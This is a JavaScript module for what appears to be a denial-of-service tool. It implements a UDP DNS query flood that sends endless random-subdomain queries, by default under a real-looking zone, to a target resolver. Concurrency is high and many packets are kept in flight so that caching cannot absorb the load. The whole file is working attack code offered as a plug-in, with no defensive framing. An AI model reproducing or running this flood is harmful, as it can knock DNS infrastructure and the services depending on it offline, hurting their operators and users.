'use strict';
const dgram = require('dgram');

function buildQuery(name, type = 1) {
  const header = Buffer.alloc(12);
  header.writeUInt16BE(Math.floor(Math.random() * 65536), 0);
  header.writeUInt16BE(0x0100, 2); // RD flag
  header.writeUInt16BE(1, 4);      // QDCOUNT

  const labels = name.split('.').filter(Boolean).map((label) => {
    const b = Buffer.from(label);
    return Buffer.concat([Buffer.from([b.length]), b]);
  });
  const qname = Buffer.concat([...labels, Buffer.from([0])]);

  const tail = Buffer.alloc(4);
  tail.writeUInt16BE(type, 0); // QTYPE
  tail.writeUInt16BE(1, 2);    // QCLASS IN

  return Buffer.concat([header, qname, tail]);
}

module.exports = {
  name: 'DNS-QUERY',
  layer: 4,
  summary: 'UDP DNS query flood with random labels, so nothing can be answered from cache.',
  defaults: { concurrency: 40 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const host = target.ip || target.host;
    const port = target.explicitPort ? target.port : 53;
    const zone = opts.payload || 'venice.ai';
    const sockets = [];
    const maxInflight = 2048;

    return {
      async worker() {
        const sock = dgram.createSocket('udp4');
        sock.on('error', () => {});
        sockets.push(sock);
        await new Promise((r) => sock.bind(0, () => r()));

        let inflight = 0;
        while (ctx.running) {
          if (inflight >= maxInflight) {
            await new Promise((r) => setImmediate(r));
            continue;
          }
          const name = `${Math.random().toString(36).slice(2, 10)}.${zone}`;
          const packet = buildQuery(name);
          inflight++;
          sock.send(packet, port, host, (err) => {
            inflight--;
            if (err) stats.err(); else stats.hit(packet.length);
          });
        }
      },
      destroy() { for (const s of sockets) { try { s.close(); } catch {} } },
    };
  },
};
